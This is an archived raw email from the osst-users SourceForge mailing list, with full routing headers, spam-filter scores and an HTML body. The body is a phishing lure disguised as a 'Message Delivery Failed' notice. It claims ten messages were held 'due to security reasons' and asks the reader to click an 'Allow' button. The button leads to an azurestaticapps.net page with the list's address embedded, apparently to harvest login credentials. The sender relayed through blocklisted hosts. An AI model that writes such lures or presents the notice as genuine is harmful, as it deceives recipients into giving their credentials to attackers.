Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 525BF87A7A5
	for <lists+osst-users@lfdr.de>; Wed, 13 Mar 2024 13:34:32 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1rkNoU-0003Kj-Pr
	for lists+osst-users@lfdr.de;
	Wed, 13 Mar 2024 12:34:31 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <support@phatfloor.com>) id 1rkNoT-0003KZ-AR
 for osst-users@lists.sourceforge.net; Wed, 13 Mar 2024 12:34:29 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=B+Q0V8fgnp7fHAkL+C2ypvEfgDYuIxxOanK7ZBFNw3c=; b=O2CawS+tKRB4z+4rt6YdEhkDLV
 3nWeZPJQfzVHVLCy2Wm6hWdUhmo8qy4Mjw7z+i7rP7+CtLXmTqDGIPF9G+AlcJn3RTxsExOryF8F3
 0FGPemqk5Hwb5B2rv8OwbJiQL/qdf9El2sixF72nQTtV6yD1lLYfcBIC4tmT9FWBvuQc=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=B+Q0V8fgnp7fHAkL+C2ypvEfgDYuIxxOanK7ZBFNw3c=; b=f
 eqZzCGAtAcX79R/1PrlWXtPlMg+Hu70LMW5wEiHux1s6eVl7t4XDpHNDsa04/4PYLoMs8f6IQEl9A
 q2X3dt5GuvnnAFSmAg7cEO2tJzwceNWhj5zPV7cpPddMOCMfwwT5JdupG0BBxYVUQY/N8ccQLHTKw
 M7HSyOYypb67SxFI=;
Received: from ip85-215-73-40.pbiaas.com ([85.215.73.40] helo=phatfloor.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1rkNoJ-0000nv-3L for osst-users@lists.sourceforge.net;
 Wed, 13 Mar 2024 12:34:29 +0000
Received: from ip85-215-73-40.pbiaas.com (account support@phatfloor.com
 [85.215.73.40] verified)
 by phatfloor.com (CommuniGate Pro SMTP 6.1.9 _community_)
 with ESMTPSA id 667698 for osst-users@lists.sourceforge.net;
 Wed, 13 Mar 2024 11:59:24 +0000
From: "Support" <support@phatfloor.com>
To: osst-users@lists.sourceforge.net
Date: 13 Mar 2024 11:59:23 +0000
Message-ID: <20240313115923.8273A7B1A0BF5EAE@phatfloor.com>
MIME-Version: 1.0
X-Spam-Score: 5.2 (+++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Message Delivery Failed Message Delivery Failed We regret
 to inform you that 10 messages failed to deliver due to security reasons. 
 Content analysis details:   (5.2 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in
 bl.spamcop.net
 [Blocked - see <https://www.spamcop.net/bl.shtml?85.215.73.40>]
 0.9 SPF_HELO_SOFTFAIL      SPF: HELO does not match SPF record (softfail)
 1.3 RCVD_IN_VALIDITY_RPBL  RBL: Relay in Validity RPBL,
 https://senderscore.org/blocklistlookup/
 [85.215.73.40 listed in bl.score.senderscore.com]
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.4 RDNS_DYNAMIC           Delivered to internal network by host with
 dynamic-looking rDNS
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
 0.3 KHOP_HELO_FCRDNS       Relay HELO differs from its IP's reverse DNS
X-Headers-End: 1rkNoJ-0000nv-3L
Subject: [Osst-users] Message Delivery Failed
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============1943225048902853414=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============1943225048902853414==
Content-Type: text/html;
	charset="utf-8"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html>

<html lang=3D"en"><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
<meta charset=3D"UTF-8">
<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D1.=
0">
<title>Message Delivery Failed</title>
<style>
    body {
        font-family: Arial, sans-serif;
        text-align: center;
        background-color: #f0f0f0;
    }
    .container {
        margin-top: 100px;
        padding: 20px;
        border-radius: 10px;
        background-color: #ffffff;
        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        width: 70%;
        margin-left: auto;
        margin-right: auto;
    }
    h1 {
        color: #333333;
    }
    p {
        color: #666666;
        margin-bottom: 20px;
    }
    button {
        padding: 10px 20px;
        font-size: 16px;
        border: none;
        border-radius: 5px;
        background-color: #4CAF50;
        color: #ffffff;
        cursor: pointer;
        transition: background-color 0.3s ease;
align: center;
width:55%;
    }
    button:hover {
        background-color: #45a049;
    }
</style>
</head>
<body style=3D"font-family: Arial, sans-serif;
        text-align: center;
        background-color: #f0f0f0">
    <div style=3D"margin-top: 100px;
        padding: 20px;
        border-radius: 10px;
        background-color: #ffffff;
        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        width: 70%;
        margin-left: auto;
        margin-right: auto" class=3D"container">
        <h1 style=3D"color: #333333">Message Delivery Failed</h1>
        <p style=3D"color: #666666;
        margin-bottom: 20px">We regret to inform you that 10 messages faile=
d to deliver due to security reasons.</p>
        <p style=3D"color: #666666;
        margin-bottom: 20px">To enable successful delivery, please click th=
e button below:</p>
        <a href=3D"https://zealous-river-09c72a610.5.azurestaticapps.net/?e=
ml=3Dosst-users@lists.sourceforge.net" target=3D"_blank"><button style=3D"p=
adding: 10px 20px;
        font-size: 16px;
        border: none;
        border-radius: 5px;
        background-color: #4CAF50;
        color: #ffffff;
        cursor: pointer;
        transition: background-color 0.3s ease;
align: center;
width:55%">Allow</button></a>
    </div>


 </body></html>


--===============1943225048902853414==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============1943225048902853414==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============1943225048902853414==--
